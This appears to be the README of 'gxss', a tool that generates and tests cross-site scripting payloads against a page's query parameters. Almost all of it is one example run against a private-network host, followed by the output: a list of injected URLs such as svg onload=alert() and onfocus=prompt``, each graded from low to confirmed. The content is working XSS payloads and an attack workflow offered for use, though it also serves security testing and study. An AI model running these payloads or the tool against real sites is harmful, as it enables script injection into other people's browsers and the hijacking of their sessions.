# gxss
Generate and test XSS payloads given injection points

```
$ echo http://192.168.1.108:9999/home | url-miner -w testwords -json | gxss -s
[low] http://192.168.1.108:9999/home?q=<xss zzxqyj=x>
[medium] http://192.168.1.108:9999/home?q=<xss onfocus=zzxqyj>
[high] http://192.168.1.108:9999/home?q=<xss onfocus=alert()>
[high] http://192.168.1.108:9999/home?q=<xss onfocus=alert(x)>
[high] http://192.168.1.108:9999/home?q=<xss onfocus=alert(1)>
[high] http://192.168.1.108:9999/home?q=<xss onfocus=prompt()>
[high] http://192.168.1.108:9999/home?q=<xss onfocus=prompt``>
[high] http://192.168.1.108:9999/home?q=<xss onfocus=alert``>
[high] http://192.168.1.108:9999/home?q=<xss onfocus=alert`x`>
[high] http://192.168.1.108:9999/home?q=<xss onfocus=javascript:alert()>
[high] http://192.168.1.108:9999/home?q=<xss onfocus=javascript:alert``>
[low] http://192.168.1.108:9999/home?q=<svg zzxqyj=x>
[medium] http://192.168.1.108:9999/home?q=<svg onload=zzxqyj>
[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=alert()%3E
[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=alert()%3E
[high] http://192.168.1.108:9999/home?q=<svg onload=alert()>
[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=alert(x)%3E
[high] http://192.168.1.108:9999/home?q=<svg onload=alert(x)>
[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=alert(1)%3E
[high] http://192.168.1.108:9999/home?q=<svg onload=alert(1)>
[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=prompt()%3E
[high] http://192.168.1.108:9999/home?q=<svg onload=prompt()>
[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=prompt``%3E
[high] http://192.168.1.108:9999/home?q=<svg onload=prompt``>

```
